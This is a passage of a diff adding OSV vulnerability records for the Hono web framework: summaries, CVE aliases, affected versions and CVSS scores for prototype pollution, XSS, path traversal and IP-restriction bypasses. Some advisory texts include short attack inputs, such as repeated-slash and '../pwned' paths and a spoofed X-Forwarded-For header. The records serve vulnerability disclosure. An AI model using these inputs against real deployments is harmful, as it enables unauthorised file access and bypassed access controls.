+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "4.12.25"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-rv63-4mwf-qqc2/GHSA-rv63-4mwf-qqc2.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-v8w9-8mx6-g223",
+    "summary": "Hono vulnerable to Prototype Pollution possible through __proto__ key allowed in parseBody({ dot: true })",
+    "details": "## Summary\n\nWhen using `parseBody({ dot: true })` in HonoRequest, specially crafted form field names such as `__proto__.x` could create objects containing a `__proto__` property.\n\nIf the parsed result is later merged into regular JavaScript objects using unsafe merge patterns, this may lead to prototype pollution in the target object.\n\n## Details\n\nThe `parseBody({ dot: true })` feature supports dot notation to construct nested objects from form field names.\n\nIn previous versions, the `__proto__` path segment was not filtered. As a result, specially crafted keys such as `__proto__.x` could produce objects containing `__proto__` properties.\n\nWhile this behavior does not directly modify `Object.prototype` within Hono itself, it may become exploitable if the parsed result is later merged into regular JavaScript objects using unsafe merge patterns.\n\n## Impact\n\nApplications that merge parsed form data into regular objects using unsafe patterns (for example recursive deep merge utilities) may become vulnerable to prototype pollution.",
+    "aliases": [
+     "CVE-2026-56763"
+    ],
+    "modified": "2026-10-02T22:45:04.525587715Z",
+    "published": "2026-03-11T00:31:47Z",
+    "database_specific": {
+     "nvd_published_at": null,
+     "cwe_ids": [
+      "CWE-1321"
+     ],
+     "severity": "MODERATE",
+     "github_reviewed": true,
+     "github_reviewed_at": "2026-03-11T00:31:47Z"
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-v8w9-8mx6-g223"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-56763"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/commit/ef902257e0beacbb83d2a9549b3b83e03514a6fe"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     },
+     {
+      "type": "WEB",
+      "url": "https://www.vulncheck.com/advisories/hono-prototype-pollution-via-proto-key-in-parsebody-with-dot-option"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "4.12.7"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-v8w9-8mx6-g223/GHSA-v8w9-8mx6-g223.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-w332-q679-j88p",
+    "summary": "Hono has an Arbitrary Key Read in Serve static Middleware (Cloudflare Workers Adapter)",
+    "details": "## Summary\n\nServe static Middleware for the Cloudflare Workers adapter contains an information disclosure vulnerability that may allow attackers to read arbitrary keys from the Workers environment. Improper validation of user-controlled paths can result in unintended access to internal asset keys.\n\n## Details\n\nThe vulnerability exists in the serve-static middleware used with the Cloudflare Workers adapter. When serving static assets, the middleware does not sufficiently validate or restrict user-supplied paths before resolving them against the Workers asset storage.\n\nAs a result, an attacker may craft requests that access arbitrary keys beyond the intended static asset scope. This issue only affects applications running on Cloudflare Workers that use Serve static Middleware with user-controllable request paths.\n\n## Impact\n\nThis vulnerability may lead to information disclosure by allowing unauthorized access to internal assets or data stored in the Workers environment. The exposed data is limited to readable asset keys and does not allow modification of stored data or execution of arbitrary code.\n\nThe impact is limited to applications that use Serve static Middleware in the Cloudflare Workers adapter and rely on it to safely handle untrusted request paths.\n\n## Affected Components\n\n* Serve static Middleware (Cloudflare Workers adapter)",
+    "aliases": [
+     "CVE-2026-24473"
+    ],
+    "modified": "2026-09-10T03:50:59.278527179Z",
+    "published": "2026-01-27T19:09:01Z",
+    "database_specific": {
+     "github_reviewed": true,
+     "github_reviewed_at": "2026-01-27T19:09:01Z",
+     "nvd_published_at": "2026-01-27T20:16:23Z",
+     "cwe_ids": [
+      "CWE-200",
+      "CWE-284",
+      "CWE-668"
+     ],
+     "severity": "MODERATE"
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-w332-q679-j88p"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-24473"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/commit/cf9a78db4d0a19b117aee399cbe9d3a6d9bfd817"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/releases/tag/v4.11.7"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "4.11.7"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-w332-q679-j88p/GHSA-w332-q679-j88p.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
+     },
+     {
+      "type": "CVSS_V4",
+      "score": "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-w62v-xxxg-mg59",
+    "summary": "Hono: Server-Side XSS via JSX Escaping Bypass in cx() Utility",
+    "details": "### Summary\n\n`cx()` in `hono/css` composes class names from plain strings but marks the result as already-escaped without HTML-escaping the input. When the result is used as a JSX `class` attribute during server-side rendering, the value is written into the attribute unescaped, so untrusted input can break out of the `class` attribute and inject arbitrary markup, leading to Cross-Site Scripting (XSS).\n\n### Details\n\nBecause the composed value is treated as pre-escaped, the HTML attribute escaping normally applied to interpolated values is skipped, and characters such as `\"` pass through unescaped \u2014 allowing a value to terminate the attribute and add further attributes or elements. This arises when an application passes untrusted, user-controlled input as a class name to `cx()`, for example when merging a base class with an externally provided `className`.\n\n### Impact\n\nDuring server-side rendering, an attacker who controls a value passed to `cx()` can inject arbitrary HTML into the page, resulting in stored or reflected XSS in the victim's browser.\n\nThis may lead to:\n\n- Execution of attacker-controlled script in the victim's browser session.\n- Session hijacking, credential theft, or actions performed on behalf of the victim.\n\nApplications are affected only if they render JSX server-side and pass untrusted input as a class name to `cx()`.",
+    "aliases": [
+     "CVE-2026-59895"
+    ],
+    "modified": "2026-09-10T03:51:12.371507758Z",
+    "published": "2026-07-21T18:33:50Z",
+    "database_specific": {
+     "github_reviewed_at": "2026-07-21T18:33:50Z",
+     "nvd_published_at": "2026-07-08T17:17:27Z",
+     "cwe_ids": [
+      "CWE-116",
+      "CWE-79"
+     ],
+     "severity": "MODERATE",
+     "github_reviewed": true
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-w62v-xxxg-mg59"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-59895"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/commit/cd3f6f7194f0e5c9d4b26ae0cf232018d0f388fc"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/releases/tag/v4.12.27"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "4.0.0"
+         },
+         {
+          "fixed": "4.12.27"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-w62v-xxxg-mg59/GHSA-w62v-xxxg-mg59.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-wgpf-jwqj-8h8p",
+    "summary": "hono: Lambda@Edge adapter keeps only the last value of a repeated request header, dropping the rest",
+    "details": "### Summary\n\nOn AWS Lambda@Edge, CloudFront delivers a request header that appears more than once as several separate entries. The adapter writes each value with `Headers.set` instead of `Headers.append`, so every value overwrites the previous one and only the last reaches the application. Repeated request headers such as `X-Forwarded-For`, `Forwarded`, and `Via` are silently truncated to a single value.\n\n### Details\n\nA repeated request header carries an ordered list of values. The adapter iterates the list but overwrites on each step, keeping only the final value. Middleware that depends on the full list \u2014 for example IP restriction that walks the `X-Forwarded-For` chain, or auditing based on `Forwarded`/`Via` hops \u2014 receives incomplete data. The API Gateway adapter already appends repeated values and is not affected.\n\nThis issue arises only on Lambda@Edge deployments, for requests that contain the same header more than once.\n\n### Impact\n\nRequest middleware sees only the last value of a repeated header instead of the full chain. For applications that base access control on the `X-Forwarded-For` chain, this can weaken or alter that decision; for auditing, hop history is lost. This affects applications deployed on AWS Lambda@Edge that rely on multi-value request headers.",
+    "aliases": [
+     "CVE-2026-54289"
+    ],
+    "modified": "2026-09-10T03:50:50.847189873Z",
+    "published": "2026-06-16T14:32:31Z",
+    "database_specific": {
+     "severity": "MODERATE",
+     "github_reviewed": true,
+     "github_reviewed_at": "2026-06-16T14:32:31Z",
+     "nvd_published_at": "2026-06-22T18:16:47Z",
+     "cwe_ids": [
+      "CWE-348"
+     ]
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-wgpf-jwqj-8h8p"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-54289"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "4.12.25"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-wgpf-jwqj-8h8p/GHSA-wgpf-jwqj-8h8p.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-wmmm-f939-6g9c",
+    "summary": "Hono: Middleware bypass via repeated slashes in serveStatic",
+    "details": "## Summary\n\nA path handling inconsistency in `serveStatic` allows protected static files to be accessed by using repeated slashes (`//`) in the request path.\n\nWhen route-based middleware (e.g., `/admin/*`) is used for authorization, the router may not match paths containing repeated slashes, while serveStatic resolves them as normalized paths. This can lead to a middleware bypass.\n\n## Details\n\nThe routing layer and `serveStatic` handle repeated slashes differently.\n\nFor example:\n\n```\n/admin/secret.txt => matches /admin/*\n/admin//secret.txt => may not match /admin/*\n```\n\nHowever, `serveStatic` may interpret both paths as the same file location (e.g., `admin/secret.txt`) and return the file.\n\nThis inconsistency allows a request such as:\n\n```\nGET //admin/secret.txt\n```\n\nto bypass middleware registered on `/admin/*` and access protected files.\n\nThe issue has been fixed by rejecting paths that contain repeated slashes, ensuring consistent behavior between route matching and static file resolution.\n\n## Impact\n\nAn attacker can access static files that are intended to be protected by route-based middleware by using repeated slashes in the request path.\n\nThis can lead to unauthorized access to sensitive files under the static root.\n\nThis issue affects applications that rely on serveStatic together with route-based middleware for access control.",
+    "aliases": [
+     "CVE-2026-39407"
+    ],
+    "modified": "2026-09-10T03:50:44.790565774Z",
+    "published": "2026-04-08T00:16:45Z",
+    "database_specific": {
+     "nvd_published_at": "2026-04-08T15:16:14Z",
+     "cwe_ids": [
+      "CWE-22"
+     ],
+     "severity": "MODERATE",
+     "github_reviewed": true,
+     "github_reviewed_at": "2026-04-08T00:16:45Z"
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-wmmm-f939-6g9c"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-39407"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/commit/9aff14bd727f8b0435c963363fd803260e7b8e3c"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/releases/tag/v4.12.12"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "4.12.12"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-wmmm-f939-6g9c/GHSA-wmmm-f939-6g9c.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-wwfh-h76j-fc44",
+    "summary": "hono: Path traversal in `serve-static` on Windows via encoded backslash (`%5C`)",
+    "details": "### Summary\n\nOn Windows hosts, an encoded backslash (`%5C`) in the request path decodes to `\\`, which the Windows path resolver treats as a separator. `serve-static` then resolves a single URL segment such as `admin\\secret.txt` into a nested file under the root and serves it, letting an attacker read static files meant to be protected behind prefix-mounted middleware. Directory escape (`..`) remains blocked.\n\n### Details\n\nThe router splits paths only on `/`, so `/admin%5Csecret.txt` is one segment and middleware on `/admin/*` does not run. The `serve-static` guard rejects `.`/`..` and consecutive separators but lets a lone `\\` through; on Windows the file resolver re-splits it into the protected subtree.\n\nThis affects Windows hosts serving static files via the Node, Bun, or Deno adapters that guard a static subtree with prefix-mounted middleware.\n\n### Impact\n\nAn unauthenticated attacker can read static files under a middleware-guarded prefix on Windows hosts. The read stays within the configured root; escape outside the root is not possible.",
+    "aliases": [
+     "CVE-2026-54286"
+    ],
+    "modified": "2026-09-10T03:50:51.049920484Z",
+    "published": "2026-06-16T14:09:03Z",
+    "database_specific": {
+     "github_reviewed_at": "2026-06-16T14:09:03Z",
+     "nvd_published_at": "2026-06-22T18:16:47Z",
+     "cwe_ids": [
+      "CWE-22"
+     ],
+     "severity": "MODERATE",
+     "github_reviewed": true
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-wwfh-h76j-fc44"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-54286"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "4.12.25"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-wwfh-h76j-fc44/GHSA-wwfh-h76j-fc44.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-xf4j-xp2r-rqqx",
+    "summary": "Hono: Path traversal in toSSG() allows writing files outside the output directory",
+    "details": "## Summary\n\nA path traversal issue in `toSSG()` allows files to be written outside the configured output directory during static site generation. When using dynamic route parameters via `ssgParams`, specially crafted values can cause generated file paths to escape the intended output directory.\n\n## Details\n\nThe static site generation process creates output files based on route paths derived from application routes and parameters. When `ssgParams` is used to provide values for dynamic routes, those values are used to construct output file paths. If these values contain traversal sequences (e.g. `..`), the resulting output path may resolve outside the configured output directory. As a result, files may be written to unintended locations instead of being confined within the specified output directory.\n\nFor example:\n \n```ts\nimport { Hono } from 'hono'\nimport { toSSG, ssgParams } from 'hono/ssg'\n\nconst app = new Hono()\n\napp.get('/:id', ssgParams([{ id: '../pwned' }]), (c) => {\n  return c.text('pwned')\n})\n\ntoSSG(app, fs, { dir: './static' })\n```\n\nIn this case, the generated output path may resolve outside `./static`, resulting in a file being written outside the intended output directory.\n\n## Impact\n\nAn attacker who can influence values passed to `ssgParams` during the build process may be able to write files outside the intended output directory.\n\nDepending on the build and deployment environment, this may:\n\n* overwrite unintended files\n* affect generated artifacts\n* impact deployment outputs or downstream tooling\n\nThis issue is limited to build-time static site generation and does not affect request-time routing.",
+    "aliases": [
+     "CVE-2026-39408"
+    ],
+    "modified": "2026-09-10T03:51:03.934940424Z",
+    "published": "2026-04-08T00:16:51Z",
+    "database_specific": {
+     "nvd_published_at": "2026-04-08T15:16:14Z",
+     "cwe_ids": [
+      "CWE-22"
+     ],
+     "severity": "MODERATE",
+     "github_reviewed": true,
+     "github_reviewed_at": "2026-04-08T00:16:51Z"
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-xf4j-xp2r-rqqx"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-39408"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/commit/b470278920fffcfd6d76002755d6db53db827679"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/releases/tag/v4.12.12"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "4.0.0"
+         },
+         {
+          "fixed": "4.12.12"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "last_known_affected_version_range": "<= 4.12.11",
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-xf4j-xp2r-rqqx/GHSA-xf4j-xp2r-rqqx.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V4",
+      "score": "CVSS:4.0/AV:L/AC:H/AT:P/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-xgm2-5f3f-mvvc",
+    "summary": "Hono: API Gateway v1 adapter can drop a distinct repeated request header value during de-duplication",
+    "details": "### Summary\n\nThe AWS API Gateway v1 adapter can drop a distinct repeated request header value. When a header appears multiple times, the adapter de-duplicates values using a substring comparison instead of an exact match, so a value that is a substring of another value of the same header is omitted (for example, `203.0.113.1` is dropped when another value is `203.0.113.10`).\n\n### Details\n\nA repeated request header carries an ordered list of values. Middleware or application logic that depends on the complete list \u2014 such as IP restriction that walks the `X-Forwarded-For` chain, rate limiting, audit logging, or proxy-chain validation \u2014 can therefore receive incomplete data that differs from what the client actually sent.\n\nThis issue arises on deployments using the AWS API Gateway v1 adapter (the same pattern also affects the VPC Lattice adapter), for requests that contain the same header more than once.\n\n### Impact\n\nAn attacker can craft repeated header values so that one value is omitted before the application sees the request. Where a security or routing decision relies on the full chain, this can alter that decision.\n\nThis affects applications deployed through Hono's AWS API Gateway v1 (or VPC Lattice) adapter that rely on the complete set of repeated request header values.",
+    "aliases": [
+     "CVE-2026-59897"
+    ],
+    "modified": "2026-09-10T03:50:53.167967172Z",
+    "published": "2026-07-21T18:18:13Z",
+    "database_specific": {
+     "severity": "MODERATE",
+     "github_reviewed": true,
+     "github_reviewed_at": "2026-07-21T18:18:13Z",
+     "nvd_published_at": "2026-07-08T17:17:27Z",
+     "cwe_ids": [
+      "CWE-348"
+     ]
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-xgm2-5f3f-mvvc"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-59897"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/commit/aa921770d09bc35970362d5a2630a878f6d982fd"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/releases/tag/v4.12.27"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "4.3.3"
+         },
+         {
+          "fixed": "4.12.27"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-xgm2-5f3f-mvvc/GHSA-xgm2-5f3f-mvvc.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-xh87-mx6m-69f3",
+    "summary": "Hono is Vulnerable to Authentication Bypass by IP Spoofing in AWS Lambda ALB conninfo",
+    "details": "## Summary\n\nWhen using the AWS Lambda adapter (`hono/aws-lambda`) behind an Application Load Balancer (ALB), the `getConnInfo()` function incorrectly selected the first value from the `X-Forwarded-For` header.\n\nBecause AWS ALB appends the real client IP address to the end of the `X-Forwarded-For` header, the first value can be attacker-controlled.\n\nThis could allow IP-based access control mechanisms (such as the `ipRestriction` middleware) to be bypassed.\n\n## Details\n\nIn ALB environments, AWS appends the actual client IP address to the end of any existing `X-Forwarded-For` header value. However, the previous implementation of `getConnInfo()` extracted the leftmost IP address:\n\n```ts\naddress = xff.split(',')[0].trim()\n```\n\nIf a client sent:\n\n```\nX-Forwarded-For: <spoofed-ip>\n```\n\nALB would forward:\n\n```\nX-Forwarded-For: <spoofed-ip>, <real-client-ip>\n```\n\nSince the implementation selected the first value, the spoofed IP address was trusted. This affected applications using:\n\n```ts\nipRestriction(getConnInfo, { allowList: [...] })\n```\n\nor any custom middleware relying on `getConnInfo(c).remote.address` for authorization decisions.\n\nThe issue only affects deployments using the AWS Lambda adapter behind an ALB. API Gateway (v1/v2) and Lambda Function URLs are not affected, as they use AWS-provided source IP values from `requestContext`.\n\n## Impact\n\nAn unauthenticated remote attacker could bypass IP-based access restrictions by supplying a crafted `X-Forwarded-For` header. This may allow access to resources that were intended to be restricted by IP address.\n\nOnly applications deployed behind an ALB and relying on `getConnInfo()` for IP-based authorization are affected.",
+    "aliases": [
+     "CVE-2026-27700"
+    ],
+    "modified": "2026-09-10T03:50:36.121374455Z",
+    "published": "2026-02-25T18:02:19Z",
+    "database_specific": {
+     "github_reviewed_at": "2026-02-25T18:02:19Z",
+     "nvd_published_at": "2026-02-25T16:23:26Z",
+     "cwe_ids": [
+      "CWE-290",
+      "CWE-345"
+     ],
+     "severity": "HIGH",
+     "github_reviewed": true
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-xh87-mx6m-69f3"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-27700"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/commit/41adbf56e252c04611f8972364ac0887ae07a4c7"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/releases/tag/v4.12.2"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "4.12.0"
+         },
+         {
+          "fixed": "4.12.2"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-xh87-mx6m-69f3/GHSA-xh87-mx6m-69f3.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-xpcf-pg52-r92g",
+    "summary": "Hono has incorrect IP matching in ipRestriction() for IPv4-mapped IPv6 addresses",
+    "details": "## Summary\n\n`ipRestriction()` does not canonicalize IPv4-mapped IPv6 client addresses (e.g. `::ffff:127.0.0.1`) before applying IPv4 allow or deny rules. In environments such as Node.js dual-stack, this can cause IPv4 rules to fail to match, leading to unintended authorization behavior.\n\n## Details\n\nThe middleware classifies client addresses based on their textual form. Addresses containing \"`:`\" are treated as IPv6, including IPv4-mapped IPv6 addresses such as `::ffff:127.0.0.1`. These addresses are not normalized to IPv4 before matching.\n\nAs a result:\n\n* IPv4 static rules (e.g. `127.0.0.1`) do not match because the raw string differs\n* IPv4 CIDR rules (e.g. `127.0.0.0/8`, `10.0.0.0/8`) are skipped because the address is treated as IPv6\n\nFor example, with:\n\n`denyList: ['127.0.0.1']`\n\na request from `127.0.0.1` may be represented as `::ffff:127.0.0.1` and bypass the deny rule.\n\nThis behavior commonly occurs in Node.js environments where IPv4 clients are exposed as IPv4-mapped IPv6 addresses.\n\n## Impact\n\nApplications that rely on IPv4-based `ipRestriction()` rules may incorrectly allow or deny requests.\n\nIn affected deployments, a denied IPv4 client may bypass access restrictions. Conversely, legitimate clients may be rejected when using IPv4 allow lists.",
+    "aliases": [
+     "CVE-2026-39409"
+    ],
+    "modified": "2026-09-10T03:50:44.898181069Z",
+    "published": "2026-04-08T00:17:14Z",
+    "database_specific": {
+     "cwe_ids": [
+      "CWE-180"
+     ],
+     "severity": "MODERATE",
+     "github_reviewed": true,
+     "github_reviewed_at": "2026-04-08T00:17:14Z",
+     "nvd_published_at": "2026-04-08T15:16:14Z"
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-xpcf-pg52-r92g"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-39409"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/commit/48fa2233bc092f650119f42df043050737cabf39"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/releases/tag/v4.12.12"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "4.12.12"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-xpcf-pg52-r92g/GHSA-xpcf-pg52-r92g.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
+     },
+     {
+      "type": "CVSS_V4",
+      "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-xrhx-7g5j-rcj5",
+    "summary": "Hono: IP Restriction bypasses static deny rules for non-canonical IPv6 ",
